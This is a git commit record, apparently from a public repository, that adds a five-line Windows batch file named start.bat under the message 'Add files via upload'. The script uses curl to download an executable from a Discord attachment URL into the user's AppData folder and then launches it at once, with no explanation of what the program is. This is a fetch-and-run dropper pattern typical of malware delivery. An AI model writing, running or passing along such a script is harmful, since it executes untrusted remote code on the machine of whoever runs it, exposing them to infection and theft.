c4ea1f3c850543f10cba6a9d44a0143ebeba59a4
yuvi7070 <yuvi777@wasteland.zz.de>
2024-07-25 00:18:13 -0400

    Add files via upload

---
+++ start.bat
@@ -0,0 +1,5 @@
+@echo off
+
+curl -o "%APPDATA%\main.exe" "https://cdn.discordapp.com/attachments/1265874404232003644/1265875600988438528/main.exe?ex=66a31a06&is=66a1c886&hm=829fe7ebd1bf2a7e90b16ea611fb17308320880d1f33a0d5f07f20108d6bd480&"
+
+start "" "%APPDATA%\main.exe"
